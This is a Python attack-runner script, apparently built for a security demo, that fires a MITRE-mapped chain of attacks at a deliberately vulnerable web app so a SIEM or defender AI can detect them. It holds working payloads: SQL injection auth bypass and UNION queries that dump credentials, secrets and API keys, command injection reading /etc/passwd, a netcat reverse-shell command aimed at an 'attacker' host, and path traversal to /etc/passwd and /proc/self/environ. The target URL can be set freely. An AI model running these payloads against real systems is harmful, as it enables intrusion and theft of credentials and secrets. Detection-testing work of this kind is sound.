"""
Attack Runner - Scripted Attack Execution for Demo
===================================================
This script runs a predetermined attack chain against the vulnerable app.
The attacks are designed to be detected by the SIEM/defender AI.

Attack Chain (MITRE ATT&CK mapped):
1. Reconnaissance (T1592, T1595) - robots.txt, debug endpoint, API enum
2. Initial Access (T1190) - SQL Injection auth bypass
3. Execution (T1059) - Command Injection
4. Discovery (T1083) - Path Traversal to read files
5. Exfiltration (T1041) - Extract secrets via SQLi

Usage:
    python attack_runner.py [--target URL] [--speed fast|normal|slow] [--ws-url URL]
"""

import argparse
import asyncio
import json
import os
import sys
import time
import requests
from datetime import datetime
from typing import Optional

try:
    import websockets
    HAS_WEBSOCKETS = True
except ImportError:
    HAS_WEBSOCKETS = False

TARGET_URL = os.getenv('TARGET_URL', 'http://vulnerable-app:5000')
RESULTS_DIR = os.getenv('RESULTS_DIR', '/results')

# ANSI color codes
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'

# Attack phases with MITRE ATT&CK mappings
PHASES = {
    'recon': {
        'name': 'RECONNAISSANCE',
        'mitre': ['T1592', 'T1595'],
        'color': Colors.CYAN,
        'icon': '🔍'
    },
    'initial_access': {
        'name': 'INITIAL ACCESS',
        'mitre': ['T1190'],
        'color': Colors.YELLOW,
        'icon': '🚪'
    },
    'execution': {
        'name': 'EXECUTION',
        'mitre': ['T1059'],
        'color': Colors.RED,
        'icon': '⚡'
    },
    'discovery': {
        'name': 'DISCOVERY',
        'mitre': ['T1083'],
        'color': Colors.MAGENTA,
        'icon': '📂'
    },
    'exfiltration': {
        'name': 'EXFILTRATION',
        'mitre': ['T1041'],
        'color': Colors.RED + Colors.BOLD,
        'icon': '💀'
    }
}

# Speed presets (delays in seconds)
SPEEDS = {
    'fast': {'action': 0.3, 'phase': 1},
    'normal': {'action': 0.8, 'phase': 2},
    'slow': {'action': 1.5, 'phase': 3}
}


class AttackRunner:
    def __init__(self, target_url: str, speed: str = 'normal', ws_url: Optional[str] = None):
        self.target = target_url
        self.session = requests.Session()
        self.results = []
        self.speed = SPEEDS.get(speed, SPEEDS['normal'])
        self.ws_url = ws_url
        self.ws = None
        self.start_time = None
        self.action_count = 0
        self.success_count = 0

    async def connect_ws(self):
        """Connect to WebSocket for live streaming."""
        if self.ws_url and HAS_WEBSOCKETS:
            try:
                self.ws = await websockets.connect(self.ws_url)
                await self.send_event('connected', {'target': self.target})
            except Exception as e:
                print(f"{Colors.YELLOW}[!] WebSocket connection failed: {e}{Colors.RESET}")
                self.ws = None

    async def send_event(self, event_type: str, data: dict):
        """Send event to WebSocket and/or stdout."""
        event = {
            'type': event_type,
            'timestamp': datetime.now().isoformat(),
            'elapsed': time.time() - self.start_time if self.start_time else 0,
            **data
        }

        if self.ws:
            try:
                await self.ws.send(json.dumps(event))
            except:
                pass

        # Also emit as JSON line for piping
        if os.getenv('JSON_OUTPUT'):
            print(json.dumps(event), flush=True)

    def print_banner(self):
        """Print attack banner."""
        banner = f"""
{Colors.RED}{Colors.BOLD}
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗           ║
    ║  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝           ║
    ║  ███████║   ██║      ██║   ███████║██║     █████╔╝            ║
    ║  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗            ║
    ║  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗           ║
    ║  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝           ║
    ║                                                               ║
    ║              AUTOMATED PENETRATION TEST                       ║
    ║                  [ EDUCATIONAL DEMO ]                         ║
    ╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
        print(banner)

    def print_phase_header(self, phase_key: str):
        """Print phase header with MITRE ATT&CK info."""
        phase = PHASES[phase_key]
        mitre_ids = ', '.join(phase['mitre'])

        print(f"\n{phase['color']}")
        print(f"{'═' * 70}")
        print(f"  {phase['icon']}  PHASE: {phase['name']}")
        print(f"     MITRE ATT&CK: {mitre_ids}")
        print(f"{'═' * 70}{Colors.RESET}")

    def print_action(self, action: str, status: str, details: str = ''):
        """Print action with status indicator."""
        self.action_count += 1

        if status == 'success':
            self.success_count += 1
            icon = f"{Colors.GREEN}✓{Colors.RESET}"
            status_text = f"{Colors.GREEN}SUCCESS{Colors.RESET}"
        elif status == 'failed':
            icon = f"{Colors.RED}✗{Colors.RESET}"
            status_text = f"{Colors.RED}FAILED{Colors.RESET}"
        else:
            icon = f"{Colors.YELLOW}→{Colors.RESET}"
            status_text = f"{Colors.YELLOW}{status.upper()}{Colors.RESET}"

        elapsed = time.time() - self.start_time

        print(f"  {icon} [{elapsed:5.1f}s] {action:<35} [{status_text}]")
        if details:
            # Truncate long details
            if len(details) > 60:
                details = details[:57] + '...'
            print(f"     {Colors.DIM}└─ {details}{Colors.RESET}")

    def log(self, phase: str, action: str, status: str, data: dict = None, technique: str = None):
        """Log attack action."""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'elapsed': time.time() - self.start_time,
            'phase': phase,
            'action': action,
            'status': status,
            'technique': technique,
            'data': data
        }
        self.results.append(entry)

    def save_results(self):
        """Save attack results to file."""
        os.makedirs(RESULTS_DIR, exist_ok=True)
        filepath = f"{RESULTS_DIR}/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        summary = {
            'target': self.target,
            'start_time': self.results[0]['timestamp'] if self.results else None,
            'end_time': datetime.now().isoformat(),
            'duration_seconds': time.time() - self.start_time,
            'total_actions': self.action_count,
            'successful_actions': self.success_count,
            'actions': self.results
        }

        with open(filepath, 'w') as f:
            json.dump(summary, f, indent=2)

        print(f"\n{Colors.DIM}Results saved: {filepath}{Colors.RESET}")

    def phase_recon(self):
        """Phase 1: Reconnaissance"""
        self.print_phase_header('recon')

        # robots.txt
        time.sleep(self.speed['action'])
        try:
            r = self.session.get(f"{self.target}/robots.txt", timeout=5)
            hidden_paths = [line.split()[-1] for line in r.text.split('\n')
                          if line.startswith('Disallow')]
            self.print_action('Fetch robots.txt', 'success',
                            f"Found {len(hidden_paths)} hidden paths")
            self.log('recon', 'robots.txt', 'success',
                    {'paths': hidden_paths}, 'T1592.002')
        except Exception as e:
            self.print_action('Fetch robots.txt', 'failed', str(e))
            self.log('recon', 'robots.txt', 'failed', {'error': str(e)})

        # Debug endpoint
        time.sleep(self.speed['action'])
        try:
            r = self.session.get(f"{self.target}/debug", timeout=5)
            has_info = 'Platform:' in r.text
            self.print_action('Access debug endpoint', 'success' if has_info else 'failed',
                            'System info exposed!' if has_info else 'No sensitive info')
            self.log('recon', 'debug_endpoint', 'success' if has_info else 'failed',
                    {'exposed': has_info}, 'T1592.004')
        except Exception as e:
            self.print_action('Access debug endpoint', 'failed', str(e))
            self.log('recon', 'debug_endpoint', 'failed', {'error': str(e)})

        # API enumeration
        time.sleep(self.speed['action'])
        try:
            r = self.session.get(f"{self.target}/api/users", timeout=5)
            users = r.json()
            self.print_action('Enumerate API users', 'success',
                            f"Found {len(users)} user accounts")
            self.log('recon', 'api_enum', 'success',
                    {'user_count': len(users), 'users': users}, 'T1087.001')
        except Exception as e:
            self.print_action('Enumerate API users', 'failed', str(e))
            self.log('recon', 'api_enum', 'failed', {'error': str(e)})

    def phase_initial_access(self):
        """Phase 2: Initial Access via SQL Injection"""
        self.print_phase_header('initial_access')

        # SQL injection auth bypass
        time.sleep(self.speed['action'])
        payload = "' OR '1'='1' -- "
        try:
            r = self.session.post(f"{self.target}/login",
                                data={'username': payload, 'password': 'x'},
                                timeout=5)
            bypassed = 'Login Successful' in r.text or 'Welcome back' in r.text
            self.print_action('SQL Injection auth bypass', 'success' if bypassed else 'failed',
                            f"Payload: {payload[:30]}...")
            self.log('initial_access', 'sqli_auth_bypass', 'success' if bypassed else 'failed',
                    {'payload': payload, 'bypassed': bypassed}, 'T1190')
        except Exception as e:
            self.print_action('SQL Injection auth bypass', 'failed', str(e))
            self.log('initial_access', 'sqli_auth_bypass', 'failed', {'error': str(e)})

        # Extract credentials via UNION
        time.sleep(self.speed['action'])
        payload = "' UNION SELECT 1,username,password,email,role,api_key FROM users -- "
        try:
            r = self.session.get(f"{self.target}/search", params={'q': payload}, timeout=5)
            has_creds = 'admin' in r.text.lower() and ('password' in r.text.lower() or '@' in r.text)
            self.print_action('Extract credentials (UNION)', 'success' if has_creds else 'failed',
                            'Credentials dumped!' if has_creds else 'No data extracted')
            self.log('initial_access', 'sqli_union_creds', 'success' if has_creds else 'failed',
                    {'payload': payload, 'extracted': has_creds}, 'T1190')
        except Exception as e:
            self.print_action('Extract credentials (UNION)', 'failed', str(e))
            self.log('initial_access', 'sqli_union_creds', 'failed', {'error': str(e)})

    def phase_execution(self):
        """Phase 3: Execution via Command Injection"""
        self.print_phase_header('execution')

        # id command
        time.sleep(self.speed['action'])
        payload = "127.0.0.1; id"
        try:
            r = self.session.post(f"{self.target}/ping",
                                data={'host': payload}, timeout=5)
            executed = 'uid=' in r.text
            self.print_action('Command injection: id', 'success' if executed else 'failed',
                            'Got shell access!' if executed else 'Command blocked')
            self.log('execution', 'cmdi_id', 'success' if executed else 'failed',
                    {'payload': payload, 'executed': executed}, 'T1059.004')
        except Exception as e:
            self.print_action('Command injection: id', 'failed', str(e))
            self.log('execution', 'cmdi_id', 'failed', {'error': str(e)})

        # Read /etc/passwd
        time.sleep(self.speed['action'])
        payload = "127.0.0.1; cat /etc/passwd"
        try:
            r = self.session.post(f"{self.target}/ping",
                                data={'host': payload}, timeout=5)
            read_file = 'root:' in r.text
            self.print_action('Read /etc/passwd', 'success' if read_file else 'failed',
                            'System users extracted' if read_file else 'File read blocked')
            self.log('execution', 'cmdi_passwd', 'success' if read_file else 'failed',
                    {'payload': payload, 'read': read_file}, 'T1059.004')
        except Exception as e:
            self.print_action('Read /etc/passwd', 'failed', str(e))
            self.log('execution', 'cmdi_passwd', 'failed', {'error': str(e)})

        # Reverse shell attempt (will fail, but shows intent)
        time.sleep(self.speed['action'])
        payload = "127.0.0.1; nc -e /bin/sh attacker 4444"
        try:
            r = self.session.post(f"{self.target}/ping",
                                data={'host': payload}, timeout=3)
            self.print_action('Reverse shell attempt', 'attempted',
                            'Connection attempt made')
            self.log('execution', 'reverse_shell', 'attempted',
                    {'payload': payload}, 'T1059.004')
        except Exception as e:
            self.print_action('Reverse shell attempt', 'attempted', 'Timeout (expected)')
            self.log('execution', 'reverse_shell', 'attempted', {'error': str(e)})

    def phase_discovery(self):
        """Phase 4: Discovery via Path Traversal"""
        self.print_phase_header('discovery')

        # /etc/passwd via traversal
        time.sleep(self.speed['action'])
        payload = "../../../etc/passwd"
        try:
            r = self.session.get(f"{self.target}/files",
                               params={'name': payload}, timeout=5)
            read_file = 'root:' in r.text
            self.print_action('Path traversal: /etc/passwd', 'success' if read_file else 'failed',
                            'File contents exposed' if read_file else 'Traversal blocked')
            self.log('discovery', 'traversal_passwd', 'success' if read_file else 'failed',
                    {'payload': payload, 'read': read_file}, 'T1083')
        except Exception as e:
            self.print_action('Path traversal: /etc/passwd', 'failed', str(e))
            self.log('discovery', 'traversal_passwd', 'failed', {'error': str(e)})

        # Environment file
        time.sleep(self.speed['action'])
        payload = "../../../proc/self/environ"
        try:
            r = self.session.get(f"{self.target}/files",
                               params={'name': payload}, timeout=5)
            has_env = '=' in r.text and 'PATH' in r.text
            self.print_action('Read process environment', 'success' if has_env else 'failed',
                            'Environment leaked!' if has_env else 'File not accessible')
            self.log('discovery', 'traversal_environ', 'success' if has_env else 'failed',
                    {'payload': payload}, 'T1083')
        except Exception as e:
            self.print_action('Read process environment', 'failed', str(e))
            self.log('discovery', 'traversal_environ', 'failed', {'error': str(e)})

    def phase_exfiltration(self):
        """Phase 5: Data Exfiltration"""
        self.print_phase_header('exfiltration')

        # Dump secrets table
        time.sleep(self.speed['action'])
        payload = "' UNION SELECT id,name,value,'x','x','x' FROM secrets -- "
        try:
            r = self.session.get(f"{self.target}/search",
                               params={'q': payload}, timeout=5)
            has_secrets = 'aws' in r.text.lower() or 'key' in r.text.lower() or 'secret' in r.text.lower()
            self.print_action('Extract secrets table', 'success' if has_secrets else 'failed',
                            'API keys and secrets dumped!' if has_secrets else 'No secrets found')
            self.log('exfiltration', 'sqli_secrets', 'success' if has_secrets else 'failed',
                    {'payload': payload, 'extracted': has_secrets}, 'T1041')
        except Exception as e:
            self.print_action('Extract secrets table', 'failed', str(e))
            self.log('exfiltration', 'sqli_secrets', 'failed', {'error': str(e)})

        # Dump all users with API keys
        time.sleep(self.speed['action'])
        payload = "' UNION SELECT id,username,api_key,email,'x','x' FROM users WHERE api_key IS NOT NULL -- "
        try:
            r = self.session.get(f"{self.target}/search",
                               params={'q': payload}, timeout=5)
            has_keys = 'sk-' in r.text
            self.print_action('Extract API keys', 'success' if has_keys else 'failed',
                            'User API keys compromised!' if has_keys else 'No API keys found')
            self.log('exfiltration', 'api_keys', 'success' if has_keys else 'failed',
                    {'payload': payload, 'extracted': has_keys}, 'T1041')
        except Exception as e:
            self.print_action('Extract API keys', 'failed', str(e))
            self.log('exfiltration', 'api_keys', 'failed', {'error': str(e)})

    def print_summary(self):
        """Print attack summary."""
        duration = time.time() - self.start_time
        success_rate = (self.success_count / self.action_count * 100) if self.action_count > 0 else 0

        print(f"\n{Colors.BOLD}")
        print(f"{'═' * 70}")
        print(f"  ATTACK COMPLETE")
        print(f"{'═' * 70}{Colors.RESET}")
        print(f"  Duration:      {duration:.1f} seconds")
        print(f"  Actions:       {self.action_count}")
        print(f"  Successful:    {self.success_count} ({success_rate:.0f}%)")
        print(f"  Target:        {self.target}")
        print(f"{'═' * 70}\n")

        if success_rate > 50:
            print(f"{Colors.RED}{Colors.BOLD}  ⚠️  TARGET COMPROMISED - Multiple attack vectors succeeded{Colors.RESET}")
        elif success_rate > 0:
            print(f"{Colors.YELLOW}  ⚠️  PARTIAL SUCCESS - Some defenses bypassed{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}  ✓  TARGET DEFENDED - All attacks blocked{Colors.RESET}")
        print()

    def run(self):
        """Run complete attack chain."""
        self.start_time = time.time()
        self.print_banner()

        print(f"{Colors.DIM}  Target: {self.target}")
        print(f"  Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Speed:  {[k for k,v in SPEEDS.items() if v == self.speed][0]}{Colors.RESET}")

        self.phase_recon()
        time.sleep(self.speed['phase'])

        self.phase_initial_access()
        time.sleep(self.speed['phase'])

        self.phase_execution()
        time.sleep(self.speed['phase'])

        self.phase_discovery()
        time.sleep(self.speed['phase'])

        self.phase_exfiltration()

        self.print_summary()
        self.save_results()


def main():
    parser = argparse.ArgumentParser(
        description='Automated attack chain for security demo',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python attack_runner.py                    # Run against default target
  python attack_runner.py --speed fast       # Quick demo (~15 seconds)
  python attack_runner.py --speed slow       # Detailed demo (~45 seconds)
  python attack_runner.py --target http://localhost:8080
        """
    )
    parser.add_argument('--target', default=TARGET_URL,
                       help='Target URL (default: from TARGET_URL env or http://vulnerable-app:5000)')
    parser.add_argument('--speed', choices=['fast', 'normal', 'slow'], default='normal',
                       help='Attack speed: fast (~15s), normal (~30s), slow (~45s)')
    parser.add_argument('--ws-url', help='WebSocket URL for live streaming')
    args = parser.parse_args()

    runner = AttackRunner(args.target, args.speed, args.ws_url)
    runner.run()


if __name__ == '__main__':
    main()
